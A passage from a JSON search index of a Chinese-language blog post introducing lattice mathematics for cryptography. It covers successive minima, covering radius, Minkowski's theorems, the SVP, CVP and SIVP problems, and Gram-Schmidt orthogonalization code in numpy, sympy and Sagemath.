\\lambda_1\\leqslant\\lambda_2\\leqslant……\\lambda_n-1\\leqslant\\lambda_n $$ 那么请注意到：取等条件： 选定笛卡尔坐标下的格 此时 $$ \\lambda_1 =\\lambda_2= …… =\\lambda_n =1 $$","date":"2023-04-04","objectID":"/lattice-part-0/:2:2","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.2.3 距离函数 μ（t,L） 注意到格是一个子群。 任取向量空间内一点，那么我们讨论距离这一点最近的一个格点，给出一些定义： 距离函数(Distance Function): μ（t,L），认为μ的本质为数量 点 t $$ \\mu (t, L)= \\min_{x∈L} \\left \\| t-x \\right \\| $$","date":"2023-04-04","objectID":"/lattice-part-0/:2:3","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.2.4 覆盖半径 μ（L) 类似地，我们认为t为动点，此时寻找μ的最大值。给出定义： 覆盖半径（Covering Radius): μ（L) $$ \\mu (L)= \\max_{x∈span(L)} μ(t,L) $$ 对覆盖的理解： 以格点为圆心，不断扩大半径，可以容易地找到当各个圆刚好覆盖整个向量空间地时候，此时半径恰好为μ（L）。 这和Lattice 的Smoothing 高度相关。 ","date":"2023-04-04","objectID":"/lattice-part-0/:2:4","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.3 Minkowski凸集定理 Fundamental Region: 为了辅助理解： 数学上，给出一个拓扑空间和在其上作用的群，一个点在群作用下的像是这个作用的一个轨道。一个基本域是这个空间的一个子集，包含了每个轨道中恰好一点。基本域具体地用几何表现出抽象的轨道代表集。 构造基本域的方法有很多。一般会要求基本域是连通的，又对其边界加上一些限制，例如是光滑或是多面的。——wikipedia 凸集：暂可以理解为是一个多维空间的一部分（一个多维物体）(详细可见References) 叠加了线性变换： 重要应用： 给出了一个Lattice中，最短向量的一个上限值 ","date":"2023-04-04","objectID":"/lattice-part-0/:3:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"最短向量 对于一个Lattice，最短向量是指该Lattice中长度最小的非零向量，而（距离原点）距离最远的最短向量则是指该Lattice中长度最小的非零向量与原点的距离最远的那个向量。这个向量通常被称为Lattice的第一个近邻向量或最优向量。 计算Lattice的最短向量和最远的最短向量是一个重要的问题，因为它们在很多应用中都有着重要的作用。其中，计算最短向量是一个NP难问题，而计算最远的最短向量则是一个NP难问题的变体。目前，已经有很多算法被提出来用于解决这些问题，但是在实际应用中，它们的效率和精度都有一定的限制。 这里给出二维的表述： 坐标平面上任何包含原点的、面积大于4的、凸的、关于原点对称的闭区域一定含有异于原点的整点。 ","date":"2023-04-04","objectID":"/lattice-part-0/:3:1","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.4Minkowski第二定理 Steven的理解： 结合向量空间，可以认为明可夫斯基第二定理给出了对于所有最短向量的的取值上限。 当然我们对det（L）做一些详细解释，以便结合曾经的明可夫斯基不等式来理解这一定理： 行列式的几何意义 $$ X^T = (a,c),X'^T = (b,d)\\\\ det(X^T,X'^T) = S $$ 二维情况下，行列式可以理解为对应平行四边形的面积。（暂不考虑复平面）注意我们这里将这一面积视为有向面积。（考虑到行列式的符号） 行列式的部分性质 行列式为零当且仅当两个向量共线（线性相关），这时平行四边形退化成一条直线[9] 行列式是一个双线性映射。 $$ det(λX+μY,X') =λdet(X,X')+ μ(Y,X') \\\\ det(X,λX'+μY') =λdet(X,X')+ μ(X,Y') $$ 在基本了解行列式之后，不难在向量空间中理解第二定理所给出的不等式。 介绍一下代数层面的理解过程： 明可夫斯基不等式给出了LP空间上的三角不等式的表达，那么第二定理则可以在LP空间以介值的方式进行理解。 明可夫斯基,相信各大赛区的“羟基选手”都很熟悉（bushi），以它来引入某一空间，那么同样的，在此空间内理解第二定理。 2.Problem in Lattice （BasisOfCrypto) 在本章节仅仅罗列了一些难解问题 维基百科中的本章内容 ","date":"2023-04-04","objectID":"/lattice-part-0/:4:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.1 SVP（Shortest Vector Problem） SVP定义： 给定一个基为的Lattice ，找到一个这个基构成的格点，使得这个点距离0坐标点的距离最近。 $$ BX :X∈ \\mathbb{Z^k}\\\\ \\left \\| Bx \\right \\| \\le \\lambda_1 $$可视化： 如果所得到基底不合适，那么计算最短向量就不是一件容易的事情了。 断言：严格的计算最短向量是困难的。 这里并不给出其NP-Hard属性的证明。 Simplify: $$ SVP_γ $$$$ BX :X∈ \\mathbb{Z^k}\\\\ \\left \\| Bx \\right \\| \\le γ\\lambda_1 $$这时候的解，则不唯一了。 ","date":"2023-04-04","objectID":"/lattice-part-0/:5:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.2CVP （Closest Vector Problem）CVP定义： 给定连续空间中任意的一个点t，找到距离这个点最近的格点Bx。 此时的t处于全集空间内，而寻找距离对应的距离最近的格点，这样一个问题。 约束距离：μ ,Lattice 的覆盖半径。 $$ Bx：x ∈\\mathbb{Z^k}\\\\ ||BX -t|| \\le \\mu $$ 覆盖半径μ给出了所有可能的t中距离格点的最长距离。 对CVP问题做同样的Simplify： $$ Bx：x ∈\\mathbb{Z^k}\\\\ ||BX -t|| \\le γ\\mu $$ 同样的不唯一。 ","date":"2023-04-04","objectID":"/lattice-part-0/:6:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.2.1 Bounded Distance Decording (Bounded Distance Decording) ","date":"2023-04-04","objectID":"/lattice-part-0/:6:1","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.2.2 Absolute Distancea Decording (Absolute Distancea Decording) ","date":"2023-04-04","objectID":"/lattice-part-0/:6:2","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.3SIVP（Shortest Independent Vector Problem) ","date":"2023-04-04","objectID":"/lattice-part-0/:7:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.4问题与联系 NP-HARD Association: 对于这里没有提到的GapSVP和GapSIVP问题，可以在wikipedia中找到详细介绍。 ","date":"2023-04-04","objectID":"/lattice-part-0/:8:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.4.1漏故而知新 理解了五大问题的基本思想和概念，那么我们把视野放在各个关系的联系上。 从ADD问题到SIVP问题： 几何上不难直观理解，找出SIVP的解，再以所得向量为基向量，不难得到ADD问题得解。 ： ","date":"2023-04-04","objectID":"/lattice-part-0/:8:1","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.4.2基于格的信息传递 3.Lattice的几何构造 在2.4中我们提到了取整。 在笛卡尔坐标系下，取整数格，CVP问题变得简单。通过上下取证，我们可以迅速解决问题。 通过把一组基进行变换，找到一组非常接近垂直的基向量的过程，称为 Lattice Basis Reduction ","date":"2023-04-04","objectID":"/lattice-part-0/:8:2","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"3.1 Gram-Schmidt 正交化 寻找一组正交向量作为基底，在Lattice中也有重大应用。 而应用的原理则为Det(L)的大小不随线性变换而改变。 ","date":"2023-04-04","objectID":"/lattice-part-0/:9:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"3.1.1基本形式 代数上： ","date":"2023-04-04","objectID":"/lattice-part-0/:9:1","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"3.1.2代码 给出基于numpy库和sympy的代码： Numpy: def my_gramSchmidt_np(vectors): #Eg:vecetors = np.array([[1,2],[3,4]]) def proj(x, u): u = unit_vec(u) return np.dot(x, u) * u def unit_vec(x): return x / np.linalg.norm(x) vectors = np.atleast_2d(vectors) if len(vectors) == 0: return [] if len(vectors) == 1: return unit_vec(vectors) u = vectors[-1] basis = my_gramSchmidt_np(vectors[0:-1]) w = np.atleast_2d(u - np.sum(proj(u, v) for v in basis)) basis = np.append(basis, unit_vec(w), axis=0) return basis Sympy: def my_gramSchmidt_sp(*vectors): normalize = True def project(a, b): return b * (a.dot(b, hermitian=True) / b.dot(b, hermitian=True)) def perp_to_subspace(vec, basis): components = [project(vec, b) for b in basis] if len(basis) == 0: return vec return vec - reduce(lambda a, b: a + b, components) ret = [] vectors = list(vectors) while len(vectors) \u003e 0 and vectors[0].is_zero_matrix: del vectors[0] for vec in vectors: perp = perp_to_subspace(vec, ret) if not perp.is_zero_matrix: ret.append(Matrix(perp)) if normalize: ret = [vec / vec.norm() for vec in ret] return ret def gram_schmidt_sp(V): # YOUR CODE HERE if type(V) is not sympy.MutableDenseMatrix: raise ValueError if len(V.tolist()) != len(V.tolist()[0]): raise ValueError V = np.array(V) V = np.transpose(V) V = Matrix(V) vlist = V.tolist() tmp_list = [] for i in vlist: tmp_list.append(Matrix(i)) result = my_gramSchmidt_sp(*tmp_list) if len(result) == len(tmp_list): ma_list = [] for i in result: tmp_list = [] for j in i: tmp_list.append(j) tmp = tmp_list ma_list.append(tmp) result = Matrix(ma_list) return result else: ma_list = [] for i in result: tmp_list = [] for j in i: tmp_list.append(j) tmp = tmp_list ma_list.append(tmp) result = Matrix(ma_list) result = Matrix(result).H result = result.row_join(Matrix([[0], [0]])) return result Sagemath: # 定义向量组 v1 = vector([1, 0, 1]) v2 = vector([1, 1, 1]) v3 = vector([0, 1, 1]) vec_list = [v1, v2, v3] # 使用 Gram-Schmidt 函数进行正交化 orth_list = GramSchmidt(vec_list) # 输出正交向量组 for v in orth_list: print(v) #在上面的代码中，我们首先定义了一个向量组，然后使用GramSchmidt函数将其转换为正交向量组。最后，我们遍历正交向量组并将其打印出来。 #需要注意的是，Gram-Schmidt函数只能在有限维向量空间上工作。如果您需要处理无限维向量空间，则需要使用其他方法。 ","date":"2023-04-04","objectID":"/lattice-part-0/:9:2","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"3.2 Lattice Rounding （取整问题） 原基向量再正交化后得到新的基向量，但是同时也产生了新的不同于原来的格。 平移：t，约束条件： 在基于Lattice的信息传输中，使用了取整，蕴含了一个不等式： 取整求解的问题： 当我们做取整操作的时候，因为几何形状的原因，最后的得到的结果格点和CVP问题的真正解会略有误差。比如我们看上图，t的落点在内圈的这个小圆内，那么我们取整得到的一定会是CVP的正确解。 正确解的条件： 上面的表述避免了使用各种不同范数的概念，可根据三维欧几里得空间辅助理解。 下图可辅助理解。 References 稀有气体：斯坦福的经验交流 CTFwiki Wikipedia 【非线性优化理论】凸集 Lattice Reduction Attacks on RSA A systematic approach to lattice models with solvable boundary states of arbitrary codimension An Introduction to Lenstra-Lenstra-Lovasz Lattice Basis Reduction Algorithm ","date":"2023-04-04","objectID":"/lattice-part-0/:10:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"}]